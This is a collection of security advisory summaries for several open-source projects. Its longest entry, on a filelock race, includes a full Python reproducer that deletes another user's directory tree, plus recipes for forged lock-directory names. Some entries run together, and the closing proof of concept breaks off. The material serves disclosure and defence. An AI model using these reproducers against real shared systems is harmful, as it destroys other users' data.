items.summary:
`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) remove their private `.filelock-*` link directories with `shutil.rmtree` (a recursive delete) on a remembered path. They do not check that the path still names the directory they created. This happens on the hard-link route (a hard link is a second name for the same file). That route is every connection on macOS since 4.1.1 and any POSIX process without a usable `/proc/self/fd` (a Linux path that names the process's own open files), such as a chroot or container that does not mount `/proc`.

Another local user who can rename entries in the directory that holds the lock database can rename one of the directories of the user running the lock (below: the lock user) onto the link directory's name, or onto a forged dead-holder name. Such a lock directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). The lock user's process then deletes that tree and everything in it with the lock user's permissions, and reports no error. Stock Linux with `/proc` mounted is not affected. Affected versions are filelock 4.1.0 through 4.2.0.

Anthropic's OSS Scanner reported this in private as `ANT-2026-LSSZIUEO` [high, CWE-367]: ReadWriteLock deletes any directory another user renames to .filelock-*.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` scores 6.1 (Medium).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): two `rename` calls and no race against filelock's own code. `I:H` (high integrity impact): the other user destroys a directory tree owned by the lock user, and the lock user's program reports no error. `A:L` (partial availability loss): the Python 3.11 `RecursionError` variant makes the lock user's first lock construction fail. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.

Classification from the external review: **conditional security**, a cross-user rename in a non-sticky shared parent that turns private-link cleanup into recursive deletion of the lock user's tree. The scanner rated it high. The review accepts the mechanism, notes that the macOS route rests on a Linux run with `/proc` hidden rather than on a run on macOS, and narrows the finding to that precondition and route.

## Scope and preconditions

- The other party is a different local account with write permission on the directory that holds the lock database, where that directory has no sticky bit. That is a `0777` directory, or a group-writable one (in a setgid `2775` directory a group member can rename the lock user's sub-directory the same way). Renaming an entry needs write permission on the parent only, not on the entry. Anyone who can write the parent can rename a `0700` directory of the lock user.
- Sticky directories (`/tmp` itself, any `1777` directory) stop the release variant: the rename of an entry owned by the lock user fails with `EPERM`. The dead-owner sweep still reaches a lock user's tree that sits inside a directory the other account owns there. That account may rename its own directory to a forged dead-owner name, and the lock user's sweep deletes everything inside it. The Python 3.11 `RecursionError` variant also works in a sticky directory.
- Platform and route. The lock user must connect through the private hard link. That is every `ReadWriteLock` or `AsyncReadWriteLock` on macOS (since 4.1.1, #820), or a POSIX process whose `/proc/self/fd/<n>` (`/dev/fd/<n>` elsewhere) does not exist, such as a chroot or container without `/proc`. Linux with `/proc` mounted connects through the descriptor and creates no `.filelock-*` directory (checked: none appears, also with two holders in one process), so stock Linux is not affected at 4.2.0. The macOS statement rests on the `descriptor_usable` branch at line 984 and `docs/how-to.rst`. The reproducer runs the same Python code on Linux with `/proc` hidden, which takes root and is test scaffolding, not a step the other user performs. Windows does not take this route.
- Target set. Only directories that sit in the shared parent itself, or that the other account can already write, are reachable. The kernel refuses to move a `0700` directory of the lock user in from another parent. A tree the other account can already write (a group-writable project tree created with umask `002`) is no gain, since that account can delete it without filelock. A lock user running as root deletes a tree of any owner.
- Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky.

## Affected code

At the scanned commit `b831496b0273`: [`_ForkSafeConnection.close` runs `shutil.rmtree` on the remembered `mkdtemp` path](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L290-L296). The path comes from [`retain_until_close`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L305-L307), set on the [link route in `_connect_through_descriptor`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L984-L1011), where [`descriptor_usable` is `False` on macOS](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L984). Three more `rmtree` sites sit in [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029) (lines 1023 and 1026) and the connect's `finally` (line 1011). The fifth is in [`_sweep_links_of_the_dead`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1032-L1051), with the name parser [`_owner_is_gone`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1054-L1065) and [`_link_prefix`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1068-L1071).

## Introduced

The link directory moved beside the database in `015d27c` ("fix(read-write): reject WAL databases and link beside the db (#805)"), and the dead-owner sweep came with `df06bbd` (#815). Both were first released in **4.1.0** (verified: `git tag --contains` gives 4.1.0 for both; 4.0.11 and 4.0.12 made the link in `TMPDIR`). macOS takes the link route for every connection since `5fd0c8f` (#820), first released in **4.1.1** (verified).

## Mechanism

When the lock connects through its private hard link, it disposes of `.filelock-*` directories with `shutil.rmtree` on a path. Nothing ties that path to the directory filelock created. `mkdtemp` makes the name unpredictable and the directory `0700`. The name is in the parent's listing as soon as it exists (`ls -a`), and renaming it needs write permission on the parent only. `0700` keeps the other user out of the directory; it does not stop a rename of the directory. There are two ways in, with the same preconditions.

**On release.** A connection lives for one acquisition: `_open_for_acquisition` opens it and `release()` reaches `close` through `_release` and `_finish_connection`. The code trusts the path from the acquire to the release, for as long as the application keeps the lock. While the lock user holds `write_lock()` on `/tmp/shared-cache/cache.db`, the directory lists `.filelock-<pid>--<host digest>-<random>/` (`0700`, owned by the lock user, containing `lock.db`). The other user runs two renames: that directory to `moved-aside`, then `victim_project` (a `0700` directory of the lock user with `notes.txt` inside) onto the link directory's name. When the lock user leaves the `with` block, `rmtree` deletes `victim_project` and everything in it with the lock user's permissions, and the process exits with status 0. `moved-aside/lock.db`, the real link, stays behind as an extra hard link to the database. The constructor's validation connection (`ReadWriteLock.__init__` opens and closes one, creating and removing a link directory) and the three error-path removals trust the path the same way, with windows a few system calls long.

**In the dead-owner sweep.** `_link_beside` calls `_sweep_links_of_the_dead(parent)` once per process and parent directory before `mkdtemp`. The first connect of every process on the link route runs it, the validation connection included. It runs `rmtree` on every `.filelock-*` directory whose name parses as a dead owner's. It checks neither the directory's owner, nor its mode, nor whether it holds only `lock.db`. `_owner_is_gone` splits the name after `.filelock-` into `pid`, `start`, `digest` (a hash of the host name) and a suffix. It returns `digest == _host_digest(host) and owner_is_stale(pid, host, start or None)`.

The other user can forge every field. Take `.filelock-2147483647--<digest>-x`. `pid` is the largest value the #821 range check accepts and above the PID limit of Linux and macOS, so `process_alive` gets `ESRCH` from `os.kill(pid, 0)`; the PID of any exited process, such as a child the other user just reaped, passes as well. `start` is empty, which the parser accepts because `_link_prefix` writes an empty field when it has no start token; with no token and a dead PID `owner_is_stale` returns `True`. `digest` is `sha256(host_name())[:16]`. `host_name()` adds a PID-namespace tag only when `/proc/self/ns/pid` is readable, which it is not on macOS or without `/proc`, so any local user can compute the digest, and it is in the name of every link directory the lock user creates. The parser does not look at the suffix.

One `rename("victim_project", ".filelock-2147483647--<digest>-x")` at any time, with no lock held, gets the tree deleted the next time any lock user process on the link route constructs a lock in that directory (a cron job, a CI step, a service restart). #821 made the parser reject non-ASCII digits and out-of-range PIDs; a well-formed name for a PID that is not running still selects the directory for removal.

The sweep's `rmtree` has a smaller effect that needs no lock user tree and works in a sticky directory, on Python 3.11, where `shutil.rmtree` recurses once per directory level. The other user creates a directory of their own under a forged dead-owner name in a `1777` directory, with 1500 nested subdirectories inside. The first `ReadWriteLock(...)` a lock user process on the link route constructs there raises `RecursionError`, which the `suppress(OSError)` at line 1050 does not catch. A second attempt in the same process skips the sweep and succeeds. Python 3.14 walks the same tree without an error.

## Reproduction

The scanner's reproducer for `ANT-2026-LSSZIUEO`, quoted as received. It ran against commit `b831496b0273`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys

shared = "/tmp/shared-cache"
project = f"{shared}/victim_project"

# ReadWriteLock takes the hard-link route (.filelock-* directory beside the database) on macOS, and elsewhere when
# /proc/self/fd/<n> is unusable. An empty /proc in a private mount namespace puts unmodified filelock on that route.
os.unshare(os.CLONE_NEWNS)
subprocess.run(["mount", "--make-rprivate", "/"], check=True)
subprocess.run(["mount", "-t", "tmpfs", "tmpfs", "/proc"], check=True)

# set up: a shared directory without the sticky bit, holding the victim's private tree
shutil.rmtree(shared, ignore_errors=True)
os.mkdir(shared)
os.chmod(shared, 0o777)
os.mkdir(project, 0o700)
with open(f"{project}/notes.txt", "w") as notes_file:
    notes_file.write("victim data\n")
shutil.chown(f"{project}/notes.txt", "victim", "victim")
shutil.chown(project, "victim", "victim")

rm = subprocess.run(["runuser", "-u", "attacker", "--", "rm", "-rf", project], capture_output=True, text=True)
print("attacker runs rm -rf on the victim's tree:", rm.stderr.strip())
assert os.path.exists(f"{project}/notes.txt"), "setup: the attacker could delete the tree without filelock"

# the victim takes the write lock and stays in its critical section
victim = subprocess.Popen(
    ["runuser", "-u", "victim", "--", sys.executable, "/tmp/repro.d/victim_hold_write_lock.py"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    text=True,
)
assert victim.stdout.readline() == "holding the write lock\n", "setup: the victim did not take the lock"
print("while the victim holds the lock:", sorted(os.listdir(shared)))

# attack
subprocess.run(["runuser", "-u", "attacker", "--", sys.executable, "/tmp/repro.d/attacker_swap_link_dir.py"], check=True)
link_dir = next(name for name in os.listdir(shared) if name.startswith(".filelock-"))
notes = f"{shared}/{link_dir}/notes.txt"
print("after the attacker's renames:", sorted(os.listdir(shared)))
print(f"{notes} exists:", os.path.exists(notes))
assert os.path.exists(notes), "setup: the attacker's renames did not happen"

# the victim leaves its with block
victim.communicate("\n", timeout=30)
print("victim exit status:", victim.returncode)
print("after the release:", sorted(os.listdir(shared)))
print(f"{notes} exists:", os.path.exists(notes))

# check: releasing a lock must not delete the victim's files
print("BUG" if not os.path.exists(notes) else "OK")
```

**`repro.d/attacker_swap_link_dir.py`**

```python
import os

shared = "/tmp/shared-cache"

# both directories are 0700 and owned by victim; renaming them needs write permission on the parent only
link_dir = next(name for name in os.listdir(shared) if name.startswith(".filelock-"))
os.rename(f"{shared}/{link_dir}", f"{shared}/moved-aside")
os.rename(f"{shared}/victim_project", f"{shared}/{link_dir}")
```

**`repro.d/victim_hold_write_lock.py`**

```python
import sys

from filelock import ReadWriteLock

lock = ReadWriteLock("/tmp/shared-cache/cache.db")
with lock.write_lock():
    print("holding the write lock", flush=True)
    sys.stdin.readline()  # stands for the work the lock protects; it ends when repro sends a line
```

## Attack sequence

```mermaid
sequenceDiagram
    participant A as other local user
    participant V as lock user's process (link route)
    participant K as filesystem (parent 0777, no sticky bit)
    rect rgb(255, 214, 214)
        Note over A,K: filelock 4.1.0 to 4.2.0 on macOS, or POSIX without /proc
        V->>K: mkdtemp(.filelock-PID--DIGEST-XXXX) mode 0700, link cache.db inside as lock.db
        V->>K: BEGIN EXCLUSIVE, write lock held
        A->>K: rename(.filelock-PID--DIGEST-XXXX, moved-aside)
        A->>K: rename(victim_project, .filelock-PID--DIGEST-XXXX)
        V->>K: release() calls shutil.rmtree(".filelock-PID--DIGEST-XXXX")
        Note over V,K: victim_project and notes.txt are gone, exit status 0, moved-aside/lock.db stays
        A->>K: later, with no lock held, rename(any directory, .filelock-2147483647--DIGEST-x)
        V->>K: next ReadWriteLock(...) in that directory sweeps dead owners by name and rmtree's the forged one
    end
```

## Evidence

The scanner's reproducer needs no race. It enters a private mount namespace and mounts an empty tmpfs over `/proc` for itself and its children (the only non-default condition, standing in for macOS). It creates `/tmp/shared-cache` (`0777`, no sticky bit) with `victim_project/notes.txt` (`0700`, owned by `victim`), shows that `rm -rf` on that tree as `attacker` fails with `Permission denied`, runs the `victim` program (`ReadWriteLock("/tmp/shared-cache/cache.db")` + `with lock.write_lock():`) and the `attacker` renames, then lets the `victim` program release. Expected output on the scanned commit:

```
attacker runs rm -rf on the victim's tree: rm: cannot remove '/tmp/shared-cache/victim_project': Permission denied
while the victim holds the lock: ['.filelock-106--39c81e1bf87b1d56-os_58i3c', 'cache.db', 'victim_project']
after the attacker's renames: ['.filelock-106--39c81e1bf87b1d56-os_58i3c', 'cache.db', 'moved-aside']
/tmp/shared-cache/.filelock-106--39c81e1bf87b1d56-os_58i3c/notes.txt exists: True
victim exit status: 0
after the release: ['cache.db', 'moved-aside']
/tmp/shared-cache/.filelock-106--39c81e1bf87b1d56-os_58i3c/notes.txt exists: False
BUG
```

The scanner showed the sweep variant by hand with the same setup and no lock held. As `attacker`, one rename of `victim_project` to `.filelock-2147483647--<digest>-x` with `<digest> = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16]`, then `ReadWriteLock("/tmp/shared-cache/cache.db")` as `victim` with `/proc` hidden. `notes.txt` is gone after the constructor returns and the directory contains only `cache.db`.

Our verification: `BUG` on `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #834 head: `OK`; the listing after the release is `['.filelock-12--4fd1986a778d5977-amfxfd9k', 'cache.db', 'moved-aside']`, `notes.txt exists: True`, and the `victim` program exits 0. Neither the scanner nor the review executed on macOS; the macOS claim rests on the `descriptor_usable` branch and the identical code after it.

## Impact

The other user chooses any directory that sits in the shared parent, and the lock user's process deletes it and everything in it with the lock user's permissions and no error; the lock user's program reports success. Without filelock that user can rename such a directory but cannot remove a non-empty one whose contents they have no permission on. With filelock the lock user's process destroys the contents. The release variant needs two `rename` calls at any point while the lock user holds the lock and wins no race against filelock's own code. The sweep variant needs one rename and no held lock, and fires on the next lock construction by any lock user process in that directory. The real link directory stays under its new name with an extra hard link to the database.

It is **not** reachable on stock Linux with `/proc` mounted at 4.2.0. The release variant is **not** reachable in a sticky directory. This is the same position as in GHSA-j8f7-rjxc-mr56 (a user who can change names in a shared lock directory). Here the name is the derived `.filelock-*` directory rather than the database, and the redirected operation is a recursive delete.

## Workarounds

- On macOS, and on any POSIX system where `/proc/self/fd` is unavailable, keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share one `ReadWriteLock` database between accounts through a `0777` or group-writable directory.
- Do not keep other directories of value beside a lock database in a directory other accounts can write; the deletion targets are siblings of the database.
- On Linux with `/proc` mounted, 4.2.0 does not take the link route and needs no workaround for this finding.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/834

items.summary:
Zephyr's Bluetooth host declares a GATT characteristic as two consecutive attributes: a Characteristic Declaration whose permission is hard-coded to BT_GATT_PERM_READ, and a Characteristic Value attribute that carries the application-specified security permissions (e.g. BT_GATT_PERM_READ_ENCRYPT / READ_AUTHEN / READ_LESC). The public notify and indicate APIs explicitly accept either attribute, and passing the declaration is the documented, common idiom. Before sending each notification or indication, the host re-checks link security with bt_gatt_check_perm() against params->attr in gatt_notify(), gatt_indicate(), and gatt_notify_multiple_verify_params() (subsys/bluetooth/host/gatt.c).

When the application passed the Characteristic Declaration attribute, the host correctly redirected the value handle but left params->attr pointing at the declaration, so the security check evaluated the declaration's permissions (no security required) instead of the value's. As a result the encryption/authentication/LESC requirement configured on the characteristic value was skipped. The Notify-Multiple path additionally used a mask that omitted the LE Secure Connections requirement.

A remote peer triggers the disclosure by connecting (optionally without pairing or encryption) and writing the Client Characteristic Configuration descriptor to enable notifications or indications, causing the server to emit the protected value over a link that has not reached the required security level. The impact is information disclosure / access-control bypass for characteristic values the application intended to expose only over a secured link; exposure depends on the application declaring encrypt/authen-required notify/indicate characteristics and on the CCC being writable at a lower security tier. There is no memory-safety or availability impact.

The fix adds bt_gatt_attr_resolve_value(), which maps a declaration attribute to the following value attribute before the permission check, and switches the Notify-Multiple path to the full BT_GATT_PERM_READ_ENCRYPT_MASK so the LESC requirement is also enforced.

items.summary:
Apptainer is an open source container platform for Linux. There is an ext4 use-after-free flaw that is exploitable through versions of Apptainer < 1.1.0 and installations that include apptainer-suid < 1.1.8 on older operating systems where that CVE has not been patched. That includes Red Hat Enterprise Linux 7, Debian 10 buster (unless the linux-5.10 package is installed), Ubuntu 18.04 bionic and Ubuntu 20.04 focal. Use-after-free flaws in the kernel can be used to attack the kernel for denial of service and potentially for privilege escalation.

Apptainer 1.1.8 includes a patch that by default disables mounting of extfs filesystem types in setuid-root mode, while continuing to allow mounting of extfs filesystems in non-setuid "rootless" mode using fuse2fs.

Some workarounds are possible. Either do not install apptainer-suid (for versions 1.1.0 through 1.1.7) or set `allow setuid = no` in apptainer.conf.  This requires having unprivileged user namespaces enabled and except for apptainer 1.1.x versions will disallow mounting of sif files, extfs files, and squashfs files in addition to other, less significant impacts.  (Encrypted sif files are also not supported unprivileged in apptainer 1.1.x.). Alternatively, use the `limit containers` options in apptainer.conf/singularity.conf to limit sif files to trusted users, groups, and/or paths, and set `allow container extfs = no` to disallow mounting of extfs overlay files.  The latter option by itself does not disallow mounting of extfs overlay partitions inside SIF files, so that's why the former options are also needed.

items.summary: Banks generates meaningful LLM prompts using a simple template language. In versions prior to 2.4.3, banks parses Tool JSON objects from the rendered body of {% completion %} blocks and later resolves their import_path field through importlib.import_module(...) + getattr(...) to obtain the callable that handles a tool call. When the LLM emits a tool_calls entry whose function.name matches the attacker-supplied tool name, the resolved callable is invoked with kwargs decoded from tool_call.function.arguments, yielding arbitrary code execution in the banks-hosting process. This is distinct from GHSA-gphh-9q3h-jgpp / CVE-2026-44209. That advisory was fixed in 2.4.2 by switching src/banks/env.py from Environment to SandboxedEnvironment. The fix does not touch src/banks/extensions/completion.py, and the unsafe import + getattr chain still executes on 2.4.2. items.summary:
Date::Manip versions through 7.00 for Perl allow CPU exhaustion via quadratic backtracking in the unanchored time substitution in _parse_time.

_parse_time removes a time from anywhere in the string with the unanchored substitution `s/$timerx/ /`, where $timerx is an auto-generated alternation of time patterns reached through a leading `(?:$atrx|^|\s+)`. The engine therefore retries the match at every position of an interior whitespace run: at each start position the leading `\s+` consumes the rest of the run greedily, the time alternation fails because the run holds no digits, and the engine backtracks a space at a time across the run before advancing the start position, which is quadratic in the length of the run. No time need be present in the string for this to happen, only a long run of whitespace, and the parse time rises about fourfold for each doubling of the run: a few kilobytes of whitespace costs seconds of CPU per parse and tens of kilobytes costs minutes.

Any caller that passes an untrusted string of unbounded length to ParseDate(), Date::Manip::Date->parse() or ->parse_time() can be made to spend unbounded CPU in a single parse, a denial of service.

items.summary:
Date::Manip versions through 7.00 for Perl return corrupted dates via non-ASCII decimal digits that pass the numeric range tests in check.

The parse regexes capture year, month and day with the `\d` shorthand, which on a character string matches the whole Unicode decimal digit property `\p{Nd}` and not just `[0-9]`. Date::Manip::Base::check then validates the captured fields with numeric comparisons alone (`$y<1 || $y>9999`, `$m<1 || $m>12`, `$d<1 || $d>$days`), and _parse_check stores the numified fields (`$y+0`). Perl truncates a string at the first character that is not an ASCII digit, so a field whose leading characters are ASCII digits numifies to an in-range prefix and satisfies every test: a year field of three ASCII digits followed by U+0664 ARABIC-INDIC DIGIT FOUR numifies to 202, giving the year 0202, and one non-ASCII digit in the month or day field shifts those fields the same way. The hour, minute and second fields match explicit ASCII character classes (`0?[0-9]`, `[0-5][0-9]`) and do not shift, though a non-ASCII digit in a fractional hour or minute field truncates the fraction.

Any caller that passes an untrusted character string to ParseDate() or Date::Manip::Date->parse() can get back a date that differs from the string it parsed, with no parse error. Where the parsed date gates logic such as an expiry check or a retention window, the shift goes unnoticed.

items.summary: ConnMan through 2.0 has a stack-based buffer overflow via a DHCPv6 Reply message. This occurs in get_domains in gdhcp/client.c. It copies a fixed NS_MAXDNAME (1025) bytes from a DHCPv6 DOMAIN_LIST (option 24) value into a 1026-byte stack buffer dns_name regardless of the actual option length, then walks DNS labels with an unbounded "c += jump + 1" loop. A crafted DHCPv6 REPLY with a DOMAIN_LIST option of >= 1025 non-zero bytes makes the label walk leave the buffer and read/write '.' past its end in attacker-chosen strides. An on-link attacker can trigger this without authentication via a forged Router Advertisement (O=1) and a forged DHCPv6 REPLY matching xid/CLIENTID with a long DOMAIN_LIST. The impact is unauthenticated on-link crash of connmand (runs as root). This was introduced in bb06c47.

items.summary: Twisted is an event-based framework for internet applications, supporting Python 3.6+. Prior to 26.10.0rc1, twisted.conch.telnet.Telnet.dataReceived appends every byte received after IAC SB to a persistent subnegotiation buffer until IAC SE is received, without applying a maximum length. Telnet option negotiation occurs before authentication, so an unauthenticated peer can omit the terminator and continuously grow the buffer. The resulting memory exhaustion can terminate the process and every service it hosts. This issue is fixed in version 26.10.0rc1.

items.summary: Twisted is an event-based framework for internet applications, supporting Python 3.6+. Prior to 26.10.0rc1, twisted.words.protocols.irc.IRC.dataReceived retains all bytes received without a line feed in its per-connection buffer and applies no maximum line length. The twisted.words.service.IRCUser server subclass inherits this behavior, and buffering occurs before PASS, NICK, or USER authentication commands. An unauthenticated connection can continuously grow the buffer until the shared server process runs out of memory and drops all users. This issue is fixed in version 26.10.0rc1.

items.summary: Apache Airflow's asset materialization endpoint (`POST /api/v2/assets/{asset_id}/materialize`) and the XCom result check on `wait_dag_run_until_finished` authorized the target Dag without its team, unlike every other authorization site. A team-aware auth manager distinguishes a team-scoped Dag from a global one by that field -- the Keycloak auth manager, for example, checks the `DAG` resource instead of `DAG:<team>` -- so the team-scoped permission that should gate the request was never consulted. In a deployment running multi-team mode with a team-aware auth manager, an authenticated user in one team could trigger Dag runs belonging to another team, supplying their own `dag_run_id` and `conf`, and could read another team's XCom values. Deployments using the FAB auth manager are unaffected, as it has no multi-team support. Users are advised to upgrade to apache-airflow 3.3.1 or later, which resolves the Dag's team at both sites.

items.summary: Apache Airflow's Task SDK did not mask the contents of a Variable whose JSON value is a list, so secrets stored in that shape appeared in cleartext in task logs and in the Rendered Templates UI. Masking was applied only when the deserialized value was a string or a dict; a list at the top level matched neither and was returned unmasked. ### Impact
With a default configuration, an undefined `readPaths`/`writePaths` meant allow-all, the `strictReadDefault` flag was inert, and the `.obsidian`/`.git`/`.trash` control directories were denied only during enumeration — not on the direct request path. A caller could read `.obsidian/plugins/*/data.json`, exfiltrating **plugin API keys and Obsidian Sync passwords** (live-reproduced), as well as any other in-vault file by path.

### Patches
Fixed in **1.3.1**. Upgrade to `>= 1.3.1`. The default now denies `.obsidian`/`.git`/`.trash` on read/write/delete and honors `strictReadDefault` on the request path.

### Workarounds
Set an explicit `readPaths`/`writePaths` whitelist that excludes the control directories.

items.summary:
## Summary

`installBazaarPlugin` (and the equivalent endpoints for widgets/icons/templates/themes) accept
`packageName`, `repoURL`, and `repoHash` as independent request fields with no validation that
they refer to the same package. `packageName` alone determines the install destination;
`repoURL`/`repoHash` alone determine what content gets downloaded and written there. A request
can name an already-installed, already-enabled plugin as `packageName` while pointing `repoURL`/
`repoHash` at different, attacker-influenced content, silently overwriting the existing plugin's
files.

## Affected code

`kernel/api/bazaar.go`:
```go
util.BindJsonArg("packageName", &packageName, true, true)
util.BindJsonArg("repoURL", &repoURL, true, true)
util.BindJsonArg("repoHash", &repoHash, true, true)
err := model.InstallBazaarPackage("plugins", repoURL, repoHash, packageName, 0)
```

`kernel/model/bazaar.go`:
```go
func getPackageInstallPath(pkgType, packageName string) (string, string, error) {
    case "plugins":
        return filepath.Join(util.DataDir, "plugins", packageName), "plugin.json", nil
```

`kernel/bazaar/install.go`:
```go
func installPackage(data []byte, installPath string) (err error) {
    ...
    if err = filelock.Copy(srcPath, installPath); err != nil { return }
    return
}
```

`installPath` is derived solely from `packageName`; the downloaded `data` is derived solely from
`repoURL`/`repoHash`; nothing cross-validates them, and `installPackage` performs no check for
whether `installPath` already contains an existing package before copying into it. The same
pattern applies to the widget/icon/template/theme install endpoints, which share
`getPackageInstallPath`.

This does not involve path traversal — `installPath` always resolves inside
`DataDir/plugins/` (or the corresponding directory for other package types), so this is not an
instance of "arbitrary file write outside the workspace path" (excluded by this project's
SECURITY.md). The issue is that the write lands in the *wrong, existing* location within the
intended directory, not outside it — an authorization/identity-verification gap, not a path
traversal.

## Reachability / why this is not trivially remote

The bazaar endpoints are gated by `model.CheckAuth`, `model.CheckAdminRole`, `model.CheckReadonly`.
When no lock-screen password is configured (the common desktop default), `CheckAuth` still
enforces a same-origin check:
```go
if !localhost || ... || ("" != origin && !util.IsLocalOrigin(origin)) || ... {
    // reject with 401
}
```
I verified `IsLocalOrigin`/`IsLocalHostname` correctly parse the `Origin` header via `url.Parse`
and check exact hostname / loopback IP:
```go
func IsLocalOrigin(origin string) bool {
    if u, err := url.Parse(origin); err == nil {
        return IsLocalHostname(u.Hostname())
    }
    return false
}
func IsLocalHostname(hostname string) bool {
    if "localhost" == hostname || strings.HasSuffix(hostname, ".localhost") {
        return true
    }
    if ip := net.ParseIP(hostname); nil != ip {
        return ip.IsLoopback()
    }
    return false
}
```
This was tested against common bypass patterns (subdomain-suffix tricks like
`localhost.attacker.com`, and `Origin: null` as sent by sandboxed iframes) and found no bypass —
this is a correctly-implemented check. This means a purely remote attacker (e.g. a malicious
website) cannot invoke this endpoint via CSRF; a request must originate from SiYuan's own
renderer origin.

## Realistic impact

Given SiYuan runs as an Electron app with `nodeIntegration: true` (per prior advisories in this
repository), a same-origin script-execution primitive (e.g. an XSS bug in the renderer, of which
several have been fixed in this repository recently) is typically already sufficient for direct
code execution. This bug's marginal value is **persistence**: a transient XSS-driven compromise
can use this endpoint to overwrite an existing, trusted, already-enabled plugin's `index.js`,
converting a one-time compromise into code that runs on every future launch of the application,
surviving after the original XSS vector is closed.

The overwrite does not effect immediately, via this specific
endpoint. `PushReloadPlugin` (the websocket event that triggers frontend hot-reload without
restart) is only called from the batch-update path (`InstallBazaarPackages`, used by
`batchUpdatePackage`), which explicitly checks `if petal != nil && petal.Enabled` before forcing
a reload via `SetPetalEnabled`. The single-package install endpoint (`installBazaarPlugin`) does
not call `PushReloadPlugin` at all — it only pushes a generic success toast. So an overwrite via
this endpoint activates on the next app restart or manual plugin toggle, rather than instantly 
still a realistic and frequent event for a desktop application, but not an instant hot-reload.

## Suggested fix

Verify that `packageName` matches the package name declared in the downloaded package's own
`plugin.json`/`theme.json`/etc. before copying into `installPath`, and/or refuse to install over
an existing, non-empty destination directory unless the request is explicitly an update of that
same package (matching by source repo identity, not just by request-supplied name).

## Verification notes

Confirmed via static source review of `kernel/api/bazaar.go`, `kernel/model/bazaar.go`,
`kernel/bazaar/install.go`, `kernel/model/session.go` (CheckAuth), `kernel/util/net.go`
(IsLocalOrigin/IsLocalHostname), and `kernel/model/push_reload.go` /
`app/src/plugin/loader.ts` (reload trigger wiring). I do not have a running SiYuan instance
in this environment to execute an end-to-end proof of concept; findings are based on tracing
the actual, unmodified control flow across these files rather than assumption.

A flaw in Node.js TLS hostname verification can cause a server certificate to be validated against a different IP address than the one the client connected to, when the host is a non-canonical IPv4 literal with a leading zero, such as `0127.0.0.1`.

`tls.checkServerIdentity()` normalizes the host following the WHATWG URL rules, which read a leading-zero octet as octal (`0127.0.0.1` becomes `87.0.0.1`), while the connection is made through the operating system resolver, which on some platforms such as macOS reads it as decimal (`127.0.0.1`). A server at the connected address can then be authenticated with a certificate issued for another IP address.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.

items.summary:
A flaw in Node.js TLS hostname verification allows a certificate without a matching IP address SAN to authenticate a connection to an IPv4 address when the host is written with non-ASCII characters, such as fullwidth digits (`１２７.0.0.1`).

`tls.checkServerIdentity()` did not recognize such hosts as IP addresses, even though they normalize and resolve to a regular IPv4 address, and matched them against the certificate DNS names and Common Name instead. A certificate containing `DNS:127.0.0.1` or `DNS:*.0.0.1` could therefore be accepted for an IP endpoint it was not issued for. This is a regression introduced after the fix for CVE-2026-48618.

This vulnerability affects Node.js **26.x** and **24.x**.

items.summary:
A flaw in Node.js DNS resolution allows hostnames containing a NUL byte to be silently truncated by the dns.resolve*() functions and dns.reverse(). This is an incomplete fix of CVE-2026-48930, which only covered dns.lookup() and the net/tls host options.

Because the name is passed to c-ares as a C string, resolving attacker.example\0.trusted.example queries attacker.example and returns its records without any error. Applications that validate a hostname, for example against a domain allowlist, and then resolve it with dns.resolve*() can act on records for a different name than the one they validated.

This vulnerability affects Node.js 26.x, 24.x, and 22.x.

items.summary:
Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in elixir-ecto postgrex allows SQL Injection via the :comment option of Postgrex.stream/4. An attacker who can influence that value can close the comment delimiter with */ and extend the streamed statement with their own clauses, which execute under the connection's role. Ecto exposes the same option through Ecto.Repo.stream/2.

Postgrex appends the comment by concatenating it into the statement text sent in the Parse message, without escaping or rejecting */. The option is validated by comment_not_present!/1 at every other execution point; stream/4 never calls it. Because Parse accepts a single command, the injection is confined to the streamed statement and further statements cannot be chained.

This issue affects postgrex: from 0.19.3 before 0.22.4.

items.summary:
### Summary

When [`PILLOW_ALIGNMENT`](https://pillow.readthedocs.io/en/stable/reference/block_allocator.html#memory-pools) is set above 1, exporting an image to Arrow returns uninitialized heap memory mixed in with the pixel data. That memory can include pixels from images the process freed earlier. 

### Details

With an alignment above 1, the default allocator pads each row up to `aligned_linesize` and starts the first row at an aligned offset into the block. It then exports `im->blocks[0].ptr` as `xsize * ysize` tightly packed pixels, so exported data includes the padding bytes, and can include a few bytes from before the first row.

Tested vulnerable on 11.2.1, 12.3.0, 4c1ed27a5.

### PoC

Whether things leak may depend on allocator configuration. This does show a leak on my Mac.

```python
import os

